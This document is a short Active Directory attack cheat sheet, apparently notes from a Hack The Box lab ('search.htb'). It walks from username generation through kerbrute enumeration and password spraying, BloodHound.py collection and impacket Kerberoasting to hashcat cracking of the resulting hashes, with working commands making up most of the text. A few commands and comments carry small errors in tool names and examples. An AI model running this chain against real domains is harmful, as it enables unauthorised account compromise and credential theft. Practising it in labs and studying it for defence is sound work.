# BloodHound.py

## Get the domain and host name

```bash
$ cme smb 10.10.11.129
```

## Enumerate usernames

### Create usernames

Create a file with the names of staff → `names.txt`:

```bash
John Doe
Alice Stewart
...
```

Python script to create usernames based on `names.txt`:

```python script.py
#!/usr/bin/env python
import sys
import os.path

if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print("usage: {} names.txt".format((sys.argv[0])))
        sys.exit(0)

    if not os.path.exists(sys.argv[1]): 
        print("{} not found".format(sys.argv[1]))
        sys.exit(0)

    for line in open(sys.argv[1]):
        name = ''.join([c for c in line if  c == " " or  c.isalpha()])

        tokens = name.lower().split()

        # skip empty lines
        if len(tokens) < 1: 
            continue

        fname = tokens[0]
        lname = tokens[-1]

        print(fname + lname)           # johndoe
        print(lname + fname)           # doejohn
        print(fname + "." + lname)     # john.doe
        print(lname + "." + fname)     # doe.john
        print(lname + fname[0])        # doej
        print(fname[0] + lname)        # jdoe
        print(lname[0] + fname)        # djoe
        print(fname[0] + "." + lname)  # j.doe
        print(lname[0] + "." + fname)  # d.john
        print(fname)                   # john
        print(lname)                   # joe
```

Just run: `python script.py names.txt`

It will create a list of usernames combining the Name and Lastname.

### Check for valid usernames with kerbrute

You need to be time sync with the target:

```python
$ sudo ntpupdate 10.10.11.129
```

Bruteforce usernames using kerbrute:

```python
$ ./kerbrute userenum --dc 10.10.11.129 -d search.htb users.txt
```

### Password spray with kerbrute

```python
$ ./kerbrute passwordspray --dc 10.10.11.129 -d search.htb users.txt 'SecretPassword'
```

## More enumeration using credentials

### Bloodhound Python

Install:

```python
git clone https://github.com/fox-it/BloodHound.py.git
```

Usage:

```python
python3 bloodhound.py -u hope.sharp -p 'SecretPassword' -d search.htb -ns 10.10.11.129 -c All
```

Start Neo4j:

```python
sudo neo4j console
```

### Bloodhound

[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

- Download the latest release

```bash
$ wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.1.0/BloodHound-linux-x64.zip
$ unzip BloodHound-linux-x64.zip
$ cd BloodHound-linux-x64
$ chmod +x BloodHound
$ ./BloodHound
```

Go to Upload Data: Import the `.json` files create by Bloodhound.py.

**FIND KERBEROASTABLE ACCOUNTS**  
BloodHound: ANALYSIS → QUERIES  
- Find all Domains Admins
    - Mark users as high value if not yet
- List all Kerberoastable Accounts  (*Found `web-svc` account.*)

Use credentials and impacket to extract the hash of Kerberoastable users:

```bash
$ GetUsersSPNs.py search.htb/hope.sharp:SecretPassword
$ GetUsersSPNs.py search.htb/hope.sharp:SecretPassword -outputfile kerbroast.hash
```

Crack the hash:

```bash
$ hashcat kerbroast.hash /usr/share/wordlists/rockyou.txt
```

If password is cracked, mark the `web-svc` user as OWNED and run the queries again.
